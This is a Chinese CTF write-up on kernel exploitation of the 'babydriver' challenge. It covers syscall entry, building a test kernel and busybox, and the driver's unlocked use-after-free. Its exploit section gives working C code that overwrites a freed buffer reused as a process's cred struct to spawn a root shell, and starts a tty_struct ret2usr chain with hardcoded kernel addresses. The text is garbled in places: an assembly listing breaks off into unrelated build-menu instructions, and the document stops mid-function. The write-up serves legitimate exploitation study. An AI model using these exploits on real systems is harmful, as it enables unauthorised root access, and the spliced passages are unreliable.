# kernel-pwn-babydriver



## 总结

其实也做了不少的内核的`pwn`题，但是总结的博客自己没有写多少。一方面是因为博客写起来相对来说比价麻烦，而我又是一个比较懒的人......好吧，虽然这篇写的是`babaydriver`这道题目，但是会总结内核`pwn`入门的一些基础只是，以及很多利用手法。就是，对题目加上很多限制之后的利用手法分析。

<!-- more -->

## 基础知识

### kernel

一图胜千言：

![image-20220312203553985](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312203553985.png)

需要注意的是，`linux`内核是单内核。因此，内核基本拥有对系统绝对的控制权。而微内核架构中，内核其实只负责寻址、内存管理、进程通信等基础功能。

### 状态切换

在学习`SROP`的时候，介绍过一个系统调用`sigreturen`，该系统调用结束后，会恢复用户态栈，进而继续执行用户态代码。这里介绍一下在软中断场景下，内核与用户态发生的切换过程。还是先看图：

![image-20220312204038518](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312204038518.png)

图中所经历的过程为：

1. 内核代替进程接受信号，将信号放入对应进程的信号队列中，同时将进程标记为`suspend`状态，然后从用户态切换到内核态
2. 陷入内核态后，内核会将用户态的寄存器状态逐一保存起来，形成一个`ucontext`结构，然后压入信号信息和`sigreturn`代码。随后，进入内核内部的工作。
3. 若注册了信号处理函数，那么程序控制权会回到用户进程，然后进入到`signal handler`函数进行处理，处理完成后会执行栈上的指令，也就是`sigreturn`系统调用
4. 进程重新陷入内核，通过`sigreturen`恢复用户态上下文信息
5. 控制权返还给用户态进程，恢复寄存器等信息，继续在用户态执行



那么在用户态切换到内核态，具体的过程为：

1. 通过`swapgs`指令切换`GS`段寄存器
2. 将当前用户态的栈的栈顶记录到`CPU`的独占变量区域中，然后将该区域内的内核栈栈顶放入`rsp`
3. 通过`push`保存用户态的所有寄存器的值
4. 通过汇编指令判断是否为`x32_abi`
5. 通过系统调用号，跳转到全局变量`sys_table_table`相应的位置继续执行系统调用



在`linux-4.4.7`，目录`arch/x86/entry/entry_64.S`：

```assembly
ENTRY(entry_SYSCALL_64)
	/*
	 * Interrupts are off on entry.
	 * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,
	 * it is too small to ever cause noticeable irq latency.
	 */
	SWAPGS_UNSAFE_STACK
	/*
	 * A hypervisor implementation might want to use a label

   Kernel hacking —-> Generic Kernel Debugging Instruments —> KGDB: kernel debugger
   kernel hacking —-> Compile the kernel with frame pointers
   ```

   基本上不需要改动，直接保存退出即可。

5. `make -j8 bzImage`

编译结束后，在`arch/x86/boot/`目录下，有`bzImage`

### busybox编译

接着是编译`busybox`，制作一个简单的文件系统。步骤为：

1. 下载`wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2`

2. 解压：`tar -jxf busybox-1.32.1.tar.bz2`

3. `make menuconfig`,主要关注：

   ```
   Settings -> Build static binary (no shared libs)
   Linux System Utilities -> Support mounting NFS file systems on Linux < 2.6.23 (NEW)
   Networking Utilities -> 取消选中 inetd
   ```

4. `make -j8`

5. `make install`

接下来做一些初始化操作：

```shell
cd _install
mkdir -pv {bin,sbin,etc,proc,sys,home,etc/init.d,lib64,lib/x86_64-linux-gnu,usr/{bin,sbin}}
touch etc/inittab
mkdir etc/init.d
touch etc/init.d/rcS
chmod +x ./etc/init.d/rcS
```

配置`etc/inttab`:

```
::sysinit:/etc/init.d/rcS
::askfirst:/bin/ash
::ctrlaltdel:/sbin/reboot
::shutdown:/sbin/swapoff -a
::shutdown:/bin/umount -a -r
::restart:/sbin/init
```

在根目录下创建`init`文件：

```
#!/bin/sh

mkdir -p /tmp

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp


exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

配置用户组：

```bash
echo "root:x:0:0:root:/root:/bin/sh" > etc/passwd
echo "ctf:x:1000:1000:ctf:/home/ctf:/bin/sh" >> etc/passwd
echo "root:x:0:" > etc/group
echo "ctf:x:1000:" >> etc/group
echo "none /dev/pts devpts gid=5,mode=620 0 0" > etc/fstab
```

配置动态链接库：

直接按照主机系统拷贝过去即可。



另外，在部署题目的时候，需要`insmod xxx.ko`

调试的时候，可以添加

```
setsid /bin/cttyhack setuidgid 0 /bin/sh
cat /proc/kallsyms > /tmp/kallsyms
cat /proc/modules > /tmp/modules
```



##  Babydriver

### 基本信息

获取`babydriver.ko`的基本信息：

![image-20220312224038051](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224038051.png)

### 函数分析

#### ioctl

![image-20220312224343188](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224343188.png)

注意这里的`babydev`是一个全局变量，首先会释放掉`device_buf`处的内存，然后重新分配，参数使用用户参进来的大小。

#### read

就是把信息拷贝给用户态指针

![image-20220312224502214](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224502214.png)



#### write

也很常规：

![image-20220312224555808](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224555808.png)

#### close

对应的是`release`函数：

会释放`device_buf`处的内容

![image-20220312224628497](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312224628497.png)

### 漏洞点

全局变量的访问不加锁，即是漏洞。可以`double free`和`use after free`。

### 利用方法

#### UAF cred结构体利用

该方法只在低版本的内核有效，高版本的特殊结构体的分配区间与普通映射区隔离开，所以子进程永远也无法分配到当前被释放的那个堆块。

本版本的内核还可以使用这种方法，因此，利用思路为：

- 打开两次`baabydev`
- 释放第一次
- 调用`fork`系统调用，得到子进程
- 通过第二次打开的句柄写，将其前`32`个字节刷为`0`
- 子进程调用`system("/bin/sh")`即可获得`root`的`shell`

结构体为：

```c
/* offset    |  size */  type = struct cred {
/*    0      |     4 */    atomic_t usage;
/*    4      |     4 */    kuid_t uid;
/*    8      |     4 */    kgid_t gid;
/*   12      |     4 */    kuid_t suid;
/*   16      |     4 */    kgid_t sgid;
/*   20      |     4 */    kuid_t euid;
/*   24      |     4 */    kgid_t egid;
/*   28      |     4 */    kuid_t fsuid;
/*   32      |     4 */    kgid_t fsgid;
/*   36      |     4 */    unsigned int securebits;
/*   40      |     8 */    kernel_cap_t cap_inheritable;
/*   48      |     8 */    kernel_cap_t cap_permitted;
/*   56      |     8 */    kernel_cap_t cap_effective;
/*   64      |     8 */    kernel_cap_t cap_bset;
/*   72      |     8 */    kernel_cap_t cap_ambient;
/*   80      |     1 */    unsigned char jit_keyring;
/* XXX  7-byte hole  */
/*   88      |     8 */    struct key *session_keyring;
/*   96      |     8 */    struct key *process_keyring;
/*  104      |     8 */    struct key *thread_keyring;
/*  112      |     8 */    struct key *request_key_auth;
/*  120      |     8 */    void *security;
/*  128      |     8 */    struct user_struct *user;
/*  136      |     8 */    struct user_namespace *user_ns;
/*  144      |     8 */    struct group_info *group_info;
/*  152      |    16 */    struct callback_head {
/*  152      |     8 */        struct callback_head *next;
/*  160      |     8 */        void (*func)(struct callback_head *);

                               /* total size (bytes):   16 */
                           } rcu;

                           /* total size (bytes):  168 */
                         }
```

![image-20220312232031701](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312232031701.png)



`exp`为：

```c
void baby_alloc(int fd, size_t size) {
    ioctl(fd, 0x10001, size);
}

// UAF 使用cred提权
void exp1()
{
    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0xa8); // sizeof(cred) == 0xa8
    close(fd1);
    pid_t child = fork();
    if (child < 0) {
        error("fork error!");
    } else if (child == 0) {
        // child
        char payload[32] = {0};
        write(fd2, &payload, 32);
        get_shell();
    } else {
        wait(NULL);
    }
    return 0;
}
```



#### UAF tty_operations结构体利用

在`open("/dev/ptmx")`的时候，会分配到一个结构体`tty_struct`：

```c
/* offset    |  size */  type = struct tty_struct {
/*    0      |     4 */    int magic;
/*    4      |     4 */    struct kref {
/*    4      |     4 */        atomic_t refcount;

                               /* total size (bytes):    4 */
                           } kref;
/*    8      |     8 */    struct device *dev;
/*   16      |     8 */    struct tty_driver *driver;
/*   24      |     8 */    const struct tty_operations *ops;
/*   32      |     4 */    int index;
/* XXX  4-byte hole  */
/*   40      |    48 */    struct ld_semaphore {
/*   40      |     8 */        long count;
/*   48      |     4 */        raw_spinlock_t wait_lock;
/*   52      |     4 */        unsigned int wait_readers;
/*   56      |    16 */        struct list_head {
/*   56      |     8 */            struct list_head *next;
/*   64      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } read_wait;
/*   72      |    16 */        struct list_head {
/*   72      |     8 */            struct list_head *next;
/*   80      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } write_wait;

                               /* total size (bytes):   48 */
                           } ldisc_sem;
/*   88      |     8 */    struct tty_ldisc *ldisc;
/*   96      |    40 */    struct mutex {
/*   96      |     4 */        atomic_t count;
/*  100      |     4 */        spinlock_t wait_lock;
/*  104      |    16 */        struct list_head {
/*  104      |     8 */            struct list_head *next;
/*  112      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  120      |     8 */        struct task_struct *owner;
/*  128      |     4 */        struct optimistic_spin_queue {
/*  128      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;

                               /* total size (bytes):   40 */
                           } atomic_write_lock;
/*  136      |    40 */    struct mutex {
/*  136      |     4 */        atomic_t count;
/*  140      |     4 */        spinlock_t wait_lock;
/*  144      |    16 */        struct list_head {
/*  144      |     8 */            struct list_head *next;
/*  152      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  160      |     8 */        struct task_struct *owner;
/*  168      |     4 */        struct optimistic_spin_queue {
/*  168      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;

                               /* total size (bytes):   40 */
                           } legacy_mutex;
/*  176      |    40 */    struct mutex {
/*  176      |     4 */        atomic_t count;
/*  180      |     4 */        spinlock_t wait_lock;
/*  184      |    16 */        struct list_head {
/*  184      |     8 */            struct list_head *next;
/*  192      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  200      |     8 */        struct task_struct *owner;
/*  208      |     4 */        struct optimistic_spin_queue {
/*  208      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;

                               /* total size (bytes):   40 */
                           } throttle_mutex;
/*  216      |    40 */    struct rw_semaphore {
/*  216      |     8 */        long count;
/*  224      |    16 */        struct list_head {
/*  224      |     8 */            struct list_head *next;
/*  232      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  240      |     4 */        raw_spinlock_t wait_lock;
/*  244      |     4 */        struct optimistic_spin_queue {
/*  244      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;
/*  248      |     8 */        struct task_struct *owner;

                               /* total size (bytes):   40 */
                           } termios_rwsem;
/*  256      |    40 */    struct mutex {
/*  256      |     4 */        atomic_t count;
/*  260      |     4 */        spinlock_t wait_lock;
/*  264      |    16 */        struct list_head {
/*  264      |     8 */            struct list_head *next;
/*  272      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } wait_list;
/*  280      |     8 */        struct task_struct *owner;
/*  288      |     4 */        struct optimistic_spin_queue {
/*  288      |     4 */            atomic_t tail;

                                   /* total size (bytes):    4 */
                               } osq;

                               /* total size (bytes):   40 */
                           } winsize_mutex;
/*  296      |     4 */    spinlock_t ctrl_lock;
/*  300      |     4 */    spinlock_t flow_lock;
/*  304      |    44 */    struct ktermios {
/*  304      |     4 */        tcflag_t c_iflag;
/*  308      |     4 */        tcflag_t c_oflag;
/*  312      |     4 */        tcflag_t c_cflag;
/*  316      |     4 */        tcflag_t c_lflag;
/*  320      |     1 */        cc_t c_line;
/*  321      |    19 */        cc_t c_cc[19];
/*  340      |     4 */        speed_t c_ispeed;
/*  344      |     4 */        speed_t c_ospeed;

                               /* total size (bytes):   44 */
                           } termios;
/*  348      |    44 */    struct ktermios {
/*  348      |     4 */        tcflag_t c_iflag;
/*  352      |     4 */        tcflag_t c_oflag;
/*  356      |     4 */        tcflag_t c_cflag;
/*  360      |     4 */        tcflag_t c_lflag;
/*  364      |     1 */        cc_t c_line;
/*  365      |    19 */        cc_t c_cc[19];
/*  384      |     4 */        speed_t c_ispeed;
/*  388      |     4 */        speed_t c_ospeed;

                               /* total size (bytes):   44 */
                           } termios_locked;
/*  392      |     8 */    struct termiox *termiox;
/*  400      |    64 */    char name[64];
/*  464      |     8 */    struct pid *pgrp;
/*  472      |     8 */    struct pid *session;
/*  480      |     8 */    unsigned long flags;
/*  488      |     4 */    int count;
/*  492      |     8 */    struct winsize {
/*  492      |     2 */        unsigned short ws_row;
/*  494      |     2 */        unsigned short ws_col;
/*  496      |     2 */        unsigned short ws_xpixel;
/*  498      |     2 */        unsigned short ws_ypixel;

                               /* total size (bytes):    8 */
                           } winsize;
/*  496:31   |     8 */    unsigned long stopped : 1;
/*  496:30   |     8 */    unsigned long flow_stopped : 1;
/* XXX  6-bit hole   */
/* XXX  3-byte hole  */
/*  504: 2   |     8 */    unsigned long unused : 62;
/* XXX  2-bit hole   */
/*  512      |     4 */    int hw_stopped;
/*  512:24   |     8 */    unsigned long ctrl_status : 8;
/*  512:23   |     8 */    unsigned long packet : 1;
/* XXX  7-bit hole   */
/* XXX  2-byte hole  */
/*  520: 9   |     8 */    unsigned long unused_ctrl : 55;
/* XXX  1-bit hole   */
/* XXX  1-byte hole  */
/*  528      |     4 */    unsigned int receive_room;
/*  532      |     4 */    int flow_change;
/*  536      |     8 */    struct tty_struct *link;
/*  544      |     8 */    struct fasync_struct *fasync;
/*  552      |     4 */    int alt_speed;
/* XXX  4-byte hole  */
/*  560      |    24 */    wait_queue_head_t write_wait;
/*  584      |    24 */    wait_queue_head_t read_wait;
/*  608      |    32 */    struct work_struct {
/*  608      |     8 */        atomic_long_t data;
/*  616      |    16 */        struct list_head {
/*  616      |     8 */            struct list_head *next;
/*  624      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } entry;
/*  632      |     8 */        work_func_t func;

                               /* total size (bytes):   32 */
                           } hangup_work;
/*  640      |     8 */    void *disc_data;
/*  648      |     8 */    void *driver_data;
/*  656      |    16 */    struct list_head {
/*  656      |     8 */        struct list_head *next;
/*  664      |     8 */        struct list_head *prev;

                               /* total size (bytes):   16 */
                           } tty_files;
/*  672      |     4 */    int closing;
/* XXX  4-byte hole  */
/*  680      |     8 */    unsigned char *write_buf;
/*  688      |     4 */    int write_cnt;
/* XXX  4-byte hole  */
/*  696      |    32 */    struct work_struct {
/*  696      |     8 */        atomic_long_t data;
/*  704      |    16 */        struct list_head {
/*  704      |     8 */            struct list_head *next;
/*  712      |     8 */            struct list_head *prev;

                                   /* total size (bytes):   16 */
                               } entry;
/*  720      |     8 */        work_func_t func;

                               /* total size (bytes):   32 */
                           } SAK_work;
/*  728      |     8 */    struct tty_port *port;

                           /* total size (bytes):  736 */
                         }
```

大小为`0x2e0`，在偏移为`24`的地方，有一个结构体`tty_operations`，存储着大量的函数指针：

```c
/* offset    |  size */  type = struct tty_operations {
/*    0      |     8 */    struct tty_struct *(*lookup)(struct tty_driver *, struct inode *, int);
/*    8      |     8 */    int (*install)(struct tty_driver *, struct tty_struct *);
/*   16      |     8 */    void (*remove)(struct tty_driver *, struct tty_struct *);
/*   24      |     8 */    int (*open)(struct tty_struct *, struct file *);
/*   32      |     8 */    void (*close)(struct tty_struct *, struct file *);
/*   40      |     8 */    void (*shutdown)(struct tty_struct *);
/*   48      |     8 */    void (*cleanup)(struct tty_struct *);
/*   56      |     8 */    int (*write)(struct tty_struct *, const unsigned char *, int);
/*   64      |     8 */    int (*put_char)(struct tty_struct *, unsigned char);
/*   72      |     8 */    void (*flush_chars)(struct tty_struct *);
/*   80      |     8 */    int (*write_room)(struct tty_struct *);
/*   88      |     8 */    int (*chars_in_buffer)(struct tty_struct *);
/*   96      |     8 */    int (*ioctl)(struct tty_struct *, unsigned int, unsigned long);
/*  104      |     8 */    long (*compat_ioctl)(struct tty_struct *, unsigned int, unsigned long);
/*  112      |     8 */    void (*set_termios)(struct tty_struct *, struct ktermios *);
/*  120      |     8 */    void (*throttle)(struct tty_struct *);
/*  128      |     8 */    void (*unthrottle)(struct tty_struct *);
/*  136      |     8 */    void (*stop)(struct tty_struct *);
/*  144      |     8 */    void (*start)(struct tty_struct *);
/*  152      |     8 */    void (*hangup)(struct tty_struct *);
/*  160      |     8 */    int (*break_ctl)(struct tty_struct *, int);
/*  168      |     8 */    void (*flush_buffer)(struct tty_struct *);
/*  176      |     8 */    void (*set_ldisc)(struct tty_struct *);
/*  184      |     8 */    void (*wait_until_sent)(struct tty_struct *, int);
/*  192      |     8 */    void (*send_xchar)(struct tty_struct *, char);
/*  200      |     8 */    int (*tiocmget)(struct tty_struct *);
/*  208      |     8 */    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);
/*  216      |     8 */    int (*resize)(struct tty_struct *, struct winsize *);
/*  224      |     8 */    int (*set_termiox)(struct tty_struct *, struct termiox *);
/*  232      |     8 */    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *);
/*  240      |     8 */    int (*poll_init)(struct tty_driver *, int, char *);
/*  248      |     8 */    int (*poll_get_char)(struct tty_driver *, int);
/*  256      |     8 */    void (*poll_put_char)(struct tty_driver *, int, char);
/*  264      |     8 */    const struct file_operations *proc_fops;

                           /* total size (bytes):  272 */
                         }
```

而对打开的`/dev/pmtx`设备进行读写的时候，最后会调用该结构体中的函数指针，以`write`为例，调用链为：

- tty_write
  - do_tty_write
    - n_tty_write
      - tty->ops->write(tty, b, nr)

当然，前面会有一系列的校验。

此时的利用思路为：

- 打开两次`babydriver`，释放`1`次，释放前将`device_buf`的大小修改为`0x2e0`
- 打开`/dev/ptmx`设备
- 修改`tty_struct`的`tty_operations`处的指针，修改为用户态的栈地址。因为没有开启`smap`，所以是可以访问用户态的数据的。
- 使用`pop rsp;ret`将栈迁移到用户态栈上来
- 关闭`smep`，执行`commit_cred(prepare_cred(0))`，然后回到用户态执行`system('/bin/sh')`

`exp`如下：

```c
// 使用tty结构体 + ret2usr提权
void exp2()
{
    save_status();
    g_prepare_kernel_cred_addr = 0xffffffff810a1810;
    g_commit_creds_addr = 0xffffffff810a1420;

    int fd1 = open(DEV_NAME, O_RDWR);
    int fd2 = open(DEV_NAME, O_RDWR);
    if (fd1 < 0 || fd2 < 0) {
        error("open error!");
    }
    baby_alloc(fd1, 0x2e0); // sizeof(tty_struct) == 0x2e0
    close(fd1);
